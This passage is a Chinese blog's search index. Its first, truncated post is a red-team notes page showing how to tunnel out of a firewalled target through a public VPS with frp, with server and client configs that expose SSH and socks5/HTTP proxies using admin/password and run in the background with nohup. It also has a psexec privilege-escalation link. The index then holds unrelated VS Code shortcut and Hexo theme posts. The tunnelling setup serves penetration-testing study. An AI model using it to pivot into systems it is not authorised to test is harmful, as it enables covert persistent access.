style="zoom:40%;"></li><li><p>使用python2链接</p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午22507877.png" alt="本地端口开启监听并连接服务端" style="zoom:40%;"></li><li><p>配置proxifier</p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午22642394.png" alt="设置本地转发地址" style="zoom:50%;"></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="proxy-2"><div class="tabs" id="reverse"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#reverse-1">frp</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="reverse-1"><p>适用于目标出网或防火墙后的机器</p><ol><li>公网vps配置<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># frps.ini 默认配置</span></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></tbody></table></figure></li><li>后台运行服务端<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frps -c ./frps.ini &gt;/dev/null &amp;</span><br></pre></td></tr></tbody></table></figure></li><li>目标机器配置<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini配置文件</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[http]</span><br><span class="line"><span class="built_in">type</span> = http</span><br><span class="line">local_port = 80</span><br><span class="line">custom_domains = mzcc_domain.com</span><br><span class="line"></span><br><span class="line">[https]</span><br><span class="line"><span class="built_in">type</span> = https</span><br><span class="line">local_port = 443</span><br><span class="line">custom_domain = mzcc_domain2.com</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用socks5插件</span></span><br><span class="line">[socks]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 6789</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = admin</span><br><span class="line">plugin_passwd = password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用http_proxy插件</span></span><br><span class="line">[http_proxy]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 6789</span><br><span class="line">plugin = http_proxy</span><br><span class="line">plugin_http_user = admin</span><br><span class="line">plugin_http_passwd = password</span><br></pre></td></tr></tbody></table></figure></li><li>后台运行客户端<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frpc -c ./frpc.ini &gt;/dev/null &amp;</span><br></pre></td></tr></tbody></table></figure></li><li>实际配置截图</li></ol><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午23628522.png" alt="服务端" style="zoom:50%;"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午23653986.png" alt="客户端" style="zoom:50%;"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午30547003.png" alt="测试访问1" style="zoom:40%;"><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午30721796.png" alt="测试访问2" style="zoom:40%;"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></p></div></div></div><p></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h3><div class="tabs" id="permission_level_up"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#permission_level_up-1"><i class="fab fa-windows"></i>windows</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="permission_level_up-1"><div class="tabs" id="windows"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#windows-1">psexec</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="windows-1"><p>参考：<a href="https://www.cnblogs.com/tomyyyyy/p/14667204.html">https://www.cnblogs.com/tomyyyyy/p/14667204.html</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> skill </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> windows </tag>
            
            <tag> 系统命令 </tag>
            
            <tag> red team </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac vscode常用快捷键</title>
      <link href="/posts/c7bc.html"/>
      <url>/posts/c7bc.html</url>
      
        <content type="html"><![CDATA[<p>复制粘贴一行代码：shift + option + 上下方向键</p><p>移动当前行代码：option + 上下方向键</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>美化hexo-butterfly主题记录 样式篇（一）</title>
      <link href="/posts/3131.html"/>
      <url>/posts/3131.html</url>
      
        <content type="html"><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>hexo + hexo-butterfly，很棒，但可定制化内容还是不多（用和别人相同的主题会死症患者），于是对主题进行魔改。</p><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><h3 id="0x00-自定义文章封面"><a href="#0x00-自定义文章封面" class="headerlink" title="0x00 自定义文章封面"></a>0x00 自定义文章封面</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3131/%E4%BF%AE%E6%94%B9_config.yml%E5%86%85%E5%AE%B9.png" alt="修改post_assert_folder为true"></p><p>进入node_modules/hexo-theme-butterfly/scripts/filters/random_cover.js，将data.path修改为data.path.slice(0,5)+”/“</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3131/%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81.jpeg" alt="修改data.path"></p><p>新建文档，添加cover字段，将封面放入同目录下生成的同名文件夹，使用去根路径的图片相对路径</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3131/%E7%94%A8%E4%BE%8B.png" alt="添加cover字段"></p><p>具体如下图，封面已正常显示，且不会与插入图片冲突</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3131/%E4%BF%AE%E6%94%B9cover%E5%9B%BE%E7%89%87.png"></p><h2 id="额外"><a href="#额外" class="headerlink" title="额外"></a>额外</h2><p>由于butterfly自带的启动logo太丑了，我顺手改掉了（对不起作者大大不要打我）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3131/%E9%AD%94%E6%94%B9logo.png" alt="嗯 舒服:)"></p><h3 id="0x01-page页面与home页面设置不同步问题"><a href="#0x01-page页面与home页面设置不同步问题" class="headerlink" title="0x01 page页面与home页面设置不同步问题"></a>0x01 page页面与home页面设置不同步问题</h3><p>page页面与home页面的top_img和大小不一致，需要修改hexo-butterfly文件中的head.styl文件</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3131/%E4%BF%AE%E6%94%B9head%E6%96%87%E4%BB%B6.png" alt="注释掉background-attachment 修改height和top的值"></p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>[*] 封面引用自<a href="https://www.pixiv.net/users/5838770">あずーる</a>大大的<a href="https://www.pixiv.net/artworks/58017733" title="魔女の旅々２">魔女の旅々２</a></p>]]></content>
      
      
      <categories>
          
          <category> skill </category>
          
          <category> blog </category>
          
          <category> record </category>
          
          <category> front-end </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> blog develop </tag>
            
            <tag> magic change </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
